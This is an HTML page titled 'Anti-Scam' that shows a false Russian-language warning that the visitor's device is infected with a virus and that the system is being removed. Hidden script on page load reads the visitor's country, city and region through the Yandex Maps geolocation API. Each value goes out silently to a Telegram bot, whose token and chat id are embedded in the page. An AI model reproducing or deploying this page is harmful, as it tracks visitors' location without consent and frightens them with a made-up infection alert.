<!DOCTYPE html>
	<html>
		<head>
			<script src="http://api-maps.yandex.ru/2.0/?load=package.full&lang=ru-RU" type="text/javascript"></script>
			<title>Anti-Scam</title>
			</head>
			<body>
			<center>
			<h1>Ваше устройство было заражено вирусом</h1>
			<h3>Пожалуйста дождитесь полного удаления системы</h3>
			</center>
			<script>
ymaps.ready(function(){

console.log(ymaps.geolocation);

var country = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Страна: "+ymaps.geolocation.country

var xhr = new XMLHttpRequest();
xhr.open("POST", country);

xhr.setRequestHeader("Accept", "application/json");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("Content-Length", "0");

xhr.send();

var city = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Город: "+ymaps.geolocation.city

var xhr = new XMLHttpRequest();
xhr.open("POST", city);

xhr.setRequestHeader("Accept", "application/json");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("Content-Length", "0");

xhr.send();

var region = "https://api.telegram.org/bot5802546784:AAEZy1vLB4YS1SZeX2xxGjACWzvDQp9I9Pw/sendMessage?chat_id=1199404728&text=Город: "+ymaps.geolocation.region

var xhr = new XMLHttpRequest();
xhr.open("POST", region);

xhr.setRequestHeader("Accept", "application/json");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.setRequestHeader("Content-Length", "0");

xhr.send();
});
			</script>
				</body>
				</html>
